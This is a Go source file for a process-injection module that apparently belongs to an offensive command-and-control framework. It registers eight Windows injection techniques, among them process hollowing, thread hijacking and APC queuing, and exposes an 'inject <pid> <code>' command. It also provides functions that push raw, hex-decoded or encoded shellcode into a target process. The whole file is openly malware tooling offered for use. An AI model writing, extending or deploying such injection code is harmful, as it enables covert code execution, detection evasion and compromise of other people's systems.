package injection

import (
	"fmt"

	"github.com/0xvyper/mihra/module"
)

type Module struct {
	Name        string
	Description string
	Version     string
	injectors   map[string]Injector
}

func NewModule() *Module {
	m := &Module{
		Name:        "process_injection",
		Description: "Module for modern process injection techniques",
		Version:     "1.0.0",
		injectors:   make(map[string]Injector),
	}

	
	m.RegisterInjector(NewCreateRemoteThreadInjector())
	m.RegisterInjector(NewNtCreateThreadExInjector())
	m.RegisterInjector(NewQueueUserAPCInjector())
	m.RegisterInjector(NewRtlCreateUserThreadInjector())
	m.RegisterInjector(NewProcessHollowingInjector())
	m.RegisterInjector(NewThreadHijackingInjector())
	m.RegisterInjector(NewUUIDInjector())
	m.RegisterInjector(NewMemoryModuleInjector())

	return m
}

func (m *Module) GetInfo() module.ModuleInfo {
	return module.ModuleInfo{
		Name:        m.Name,
		Version:     m.Version,
		Description: m.Description,
		Author:      "C2 Framework",
		Commands: []module.CommandInfo{
			{
				Name:        "inject",
				Description: "Inject code into a process",
				Usage:       "inject <pid> <code>",
				Options:     map[string]string{},
			},
		},
		Options: map[string]string{
			"enabled": "true",
		},
	}
}

func (m *Module) RegisterInjector(injector Injector) {
	m.injectors[injector.Name()] = injector
}

func (m *Module) GetInjector(name string) (Injector, error) {
	injector, ok := m.injectors[name]
	if !ok {
		return nil, fmt.Errorf("injector not found: %s", name)
	}
	return injector, nil
}

func (m *Module) ListInjectors() []string {
	var names []string
	for name := range m.injectors {
		names = append(names, name)
	}
	return names
}

func (m *Module) InjectShellcode(technique string, pid int, shellcode []byte) error {
	injector, err := m.GetInjector(technique)
	if err != nil {
		return err
	}

	return injector.Inject(pid, shellcode)
}

func (m *Module) GetInjectorDescription(name string) (string, error) {
	injector, err := m.GetInjector(name)
	if err != nil {
		return "", err
	}
	return injector.Description(), nil
}

func (m *Module) ShellcodeFromHex(technique string, pid int, hexStr string) error {
	utils := NewShellcodeUtils()
	shellcode, err := utils.HexToShellcode(hexStr)
	if err != nil {
		return err
	}

	return m.InjectShellcode(technique, pid, shellcode)
}

func (m *Module) EncodeAndInjectShellcode(technique string, pid int, shellcode []byte, key byte) error {
	utils := NewShellcodeUtils()
	encoded := utils.EncodeShellcode(shellcode, key)

	
	
	decoded := utils.DecodeShellcode(encoded, key)

	return m.InjectShellcode(technique, pid, decoded)
}
